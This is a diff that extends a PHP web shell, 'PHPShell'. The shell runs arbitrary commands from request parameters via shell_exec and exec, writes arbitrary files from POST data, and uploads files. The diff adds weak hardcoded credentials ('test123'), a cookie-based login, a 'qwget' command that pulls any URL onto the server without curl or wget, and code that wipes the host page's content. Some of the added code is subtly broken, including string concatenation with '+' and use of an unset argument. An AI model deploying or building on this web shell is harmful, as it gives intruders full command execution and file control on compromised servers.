@@ -8,9 +8,9 @@ $GLOBALS['PC'] = array(
 'MODE' => 'interactive-stdin',
 'WIN_PROMPT' => '%cwd%> ', //Classic DOS style
 'NIX_PROMPT' => '%user%@%hostname%:%cwd% #',
-'USE_AUTH' => false,
-'AUTH_USERNAME' => 'phpshell',
-'AUTH_PASSWORD' => 'phpshell',
+'USE_AUTH' => true,
+'AUTH_USERNAME' => 'test123',
+'AUTH_PASSWORD' => 'test123',
 'ENV' => array(
 'WIN' => array(),
 'NIX' => array()
@@ -19,11 +19,24 @@ $GLOBALS['PC'] = array(
 ?>
 <?php
 $args=PS::getArgvAssoc();
+function alt_auth(){
+?>
+<form method="POST">
+<input type="password" name="psauth"><input type="submit" value="Enter" />
+</form>
+<?php
+exit;
+}
 if(@$GLOBALS['PC']['USE_AUTH'] && !isset($args['cmd'])){
+if(@$_POST['psauth'] == $GLOBALS['PC']['AUTH_PASSWORD']
+|| @$_COOKIE['psauth'] == md5($GLOBALS['PC']['AUTH_PASSWORD'])){
+setcookie('psauth', md5($GLOBALS['PC']['AUTH_PASSWORD']),time()+3600);
+} else {
 if (!isset($_SERVER['PHP_AUTH_USER'])) {
 header('WWW-Authenticate: Basic realm="My Realm"');
 header('HTTP/1.0 401 Unauthorized');
 echo 'Authentication required.';
+alt_auth();
 exit;
 }
 if($_SERVER['PHP_AUTH_USER'] != @$GLOBALS['PC']['AUTH_USERNAME']
@@ -32,7 +45,9 @@ if($_SERVER['PHP_AUTH_USER'] != @$GLOBALS['PC']['AUTH_USERNAME']
 header('WWW-Authenticate: Basic realm="My Realm"');
 header('HTTP/1.0 401 Unauthorized');
 echo 'Authentication required.';
+alt_auth();
 exit;
+}
 }
 }
 function rC($f,$cmd,$help=''){
@@ -91,10 +106,16 @@ var SI = <?php echo json_encode($this->getShellInfo());?>;
 $(function(){
 var input = '';
 var history = [];
+try {
+history = JSON.parse(localStorage.getItem('hist')) || [];
+} catch(e){}
 var currentHistory = 0;
 var $pre = $('<pre>');
-var mode = 'interactive';
-var supportedModes = ['interactive','shell_exec'];
+$('body > *').each(function(){
+$(this).remove();
+});
+var mode = localStorage.getItem('ps_xmode') || SI.mode || 'exec';
+var supportedModes = ['interactive','shell_exec','exec'];
 var onCommandListeners = [];
 $('body').append($pre);
 var $output = $('<span class="output"></span>');
@@ -237,7 +258,10 @@ procStdIn = [];
 }
 function runStatement(){
 var statement = $input.val();
+if(history[history.length-1] !== statement){
 history.push(statement);
+localStorage.setItem('hist', JSON.stringify(history));
+}
 currentHistory = 0;
 $input.val('');
 writeln(statement);
@@ -263,8 +287,10 @@ if(setMode && setMode.length == 2){
 if($.inArray(setMode[1],supportedModes) > -1){
 mode = setMode[1];
 writeln('PHPShell mode set to '+mode);
+localStorage.setItem('ps_xmode', mode);
 } else {
-writeln('"'+setMode[1]+'" is not a valid option.\nSupported modes: '+supportedModes.join(', '));
+writeln('"'+setMode[1]+'" is not a valid option.\nSupported modes: '+supportedModes.join(', ')
++ "\nCurrent mode: "+mode);
 }
 writeCwdLine();
 return;
@@ -286,9 +312,8 @@ if(mode == "interactive" && response.handle){
 currentHandle = response.handle;
 procStdIn = [];
 readProc();
-console.log('1');
 } else {
-write(response.output);
+write(response.html ? response.output : document.createTextNode(response.output));
 SI.cwd = response.cwd;
 writeCwdLine();
 animateCursor();
@@ -507,13 +532,20 @@ return $argv;
 }
 private function runCommand($cmd,$mode="shell_exec"){
 $output = $this->processInternalCommand($cmd);
-if($output === null && ($mode=="shell_exec" || !$mode) ){
+if($output === null){
+if($mode=="shell_exec" || !$mode){
 $output = shell_exec($_REQUEST['cmd'].' 2>&1');
-if($output === null) $output = 'Command not found';
-else $output = htmlspecialchars ($output,null,'UTF-8');
-} elseif($mode == "interactive" && $output === null) {
+} elseif($mode=="exec") {
+$return = -1;
+$output = "";
+exec($_REQUEST['cmd'].' 2>&1', $output, $return);
+$output = implode($output,"\n");
+} elseif($mode == "interactive") {
 $this->startAsyncProc($cmd);
 exit;
+}
+} else {
+$html = true;
 }
 $detectedEncoding = mb_detect_encoding($output, mb_list_encodings(),true);
 if($detectedEncoding != 'UTF-8'){
@@ -521,6 +553,7 @@ $output = iconv($detectedEncoding, 'UTF-8//TRANSLIT//IGNORE', $output);
 }
 echo json_encode(array(
 'output' => $output,
+'html' => $html,
 'cwd' => getcwd()
 ));
 exit;
@@ -573,7 +606,8 @@ return array(
 ? trim(shell_exec('echo %USERNAME%'))
 : '?'
 ),
-'hostname' => gethostname(),
+'mode' => $GLOBALS['PC']['MODE'],
+'hostname' => function_exists('gethostname') ? gethostname() : 'unknown-host',
 'prompt_style' => $GLOBALS['PC'][PS::iW()?'WIN_PROMPT':'NIX_PROMPT']
 );
 }
@@ -652,14 +686,14 @@ rC('ps_ls','ls','List directory content');
 else
 rC('ps_ls','list','List directory content');
 function ps_qedit($args){
-echo '<div class="qedit" data-file="'.htmlentities($args).'"><textarea>'.htmlentities(@file_get_contents(realpath($args))).'</textarea><button class="save">Save</button></div>';
+echo '<div class="qedit" data-file="'.htmlentities($args).'"><textarea>'.@str_replace(['<','>'],['&lt;','&gt;'],file_get_contents(realpath($args))).'</textarea><button class="save">Save</button></div>';
 }
 if(isset($_POST['qedit_content']) && isset($_POST['qedit_fn'])){
 echo file_put_contents($_POST['qedit_fn'],$_POST['qedit_content']);
 }
 rC('ps_qedit','qedit','Edit various data files. supported: txt');
 ?>
-<?php
+<?php   
 function ps_qput($args){
 echo '<iframe src="?qputfrm=1&cwd='. urlencode($_POST['cwd']) .'"><iframe>';
 }
@@ -673,7 +707,32 @@ if(isset($_GET['qputfrm'])){
 ps_qput_frm();
 exit;
 }
-rC('ps_qput','qput','Edit various data files. supported: txt');
+rC('ps_qput','qput','Put file(s)');
+?>
+<?php   
+function ps_qwget($args){
+$args = PS::strToArgv($args);
+if(count($args) == 0){
+echo "Usage: qwget URL [FILE]";
+} else {
+$http_handle = fopen($args[0], "r");
+$fn = isset($args[1]) ? $args[1]
+: pathinfo($args[1], PATHINFO_BASENAME);
+$file_handle = fopen($fn, 'w');
+if($http_handle === FALSE) echo "Failed to get url: " + $args[0];
+if($file_handle === FALSE) echo "Failed to get create file: " + $args[1];
+while (!feof($http_handle)) {
+echo ".";
+fwrite($file_handle, fread($http_handle, 512));
+}
+echo "Downloaded file to: $fn";
+fclose($file_handle);
+}
+}
+if(isset($_POST['qedit_content']) && isset($_POST['qedit_fn'])){
+echo file_put_contents($_POST['qedit_fn'],$_POST['qedit_content']);
+}
+rC('ps_qwget','qwget','When you need curl or wget, but neither are there.');
 ?>
 <?php
 function ps_prntscrn($args){
